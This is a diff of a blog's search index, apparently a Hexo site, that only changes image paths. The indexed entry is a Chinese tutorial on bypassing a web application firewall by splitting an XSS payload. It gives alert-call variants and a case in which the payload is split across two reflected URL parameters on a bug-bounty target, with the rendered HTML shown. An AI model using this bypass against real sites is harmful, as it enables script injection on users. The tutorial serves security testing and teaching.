@@ -830,16 +830,16 @@
   <entry>
     <title>【XSS Tips】分割构造Payload绕过WAF</title>
     <url>/2025/11/02/%E3%80%90XSS-Tips%E3%80%91%E5%88%86%E5%89%B2%E6%9E%84%E9%80%A0Payload%E7%BB%95%E8%BF%87WAF/</url>
-    <content><![CDATA[<h1 id="分割绕过Waf"><a href="#分割绕过Waf" class="headerlink" title="分割绕过Waf"></a>分割绕过Waf</h1><p>众所周知，<code>alert(111)</code>可以弹窗<br><img src="/images/test/photo/Pasted%20image%2020250711142713.png"></p>
+    <content><![CDATA[<h1 id="分割绕过Waf"><a href="#分割绕过Waf" class="headerlink" title="分割绕过Waf"></a>分割绕过Waf</h1><p>众所周知，<code>alert(111)</code>可以弹窗<br><img src="/images/Pasted%20image%2020250711142713.png"></p>
 <p>同样的道理，这样也可以</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert<span class="string">`111`</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/test/photo/Pasted%20image%2020250711142814.png"></p>
+<p><img src="/images/Pasted%20image%2020250711142814.png"></p>
 <p>这样也行：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(alert)(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="/images/test/photo/Pasted%20image%2020250711143101.png"></p>
+<p><img src="/images/Pasted%20image%2020250711143101.png"></p>
 <p>这样也可以：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(alert)<span class="comment">/*aaaaaaasasas*/</span>(<span class="number">1</span>)</span><br><span class="line">alert<span class="comment">/*aaaaaaasasas*/</span>(<span class="number">1</span>)</span><br><span class="line">alert<span class="comment">/*aaaaaaasasas*/</span><span class="string">`1`</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/test/photo/Pasted%20image%2020250711143337.png"></p>
+<p><img src="/images/Pasted%20image%2020250711143337.png"></p>
 <p>那么在现实情况中，我们可以用这种特性构造payload，将alert和后面的括号分开，以此绕过waf。</p>
 <p>给各位爷来个案例：<br>一个SRC，链接中有两个参数，两个参数都在前端返回，并且可以插入html代码。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/ca/login?error=111&amp;url=222</span><br></pre></td></tr></table></figure>
@@ -853,7 +853,7 @@
 <p>返回：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">111<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert/*</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;222*/(11)</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p>这样则可以做到bypass绕过waf：<br><img src="/images/test/photo/Pasted%20image%2020250711144211.png"><br><img src="/images/test/photo/Pasted%20image%2020250711144327.png"></p>
+<p>这样则可以做到bypass绕过waf：<br><img src="/images/Pasted%20image%2020250711144211.png"><br><img src="/images/Pasted%20image%2020250711144327.png"></p>
 ]]></content>
   </entry>
 </search>
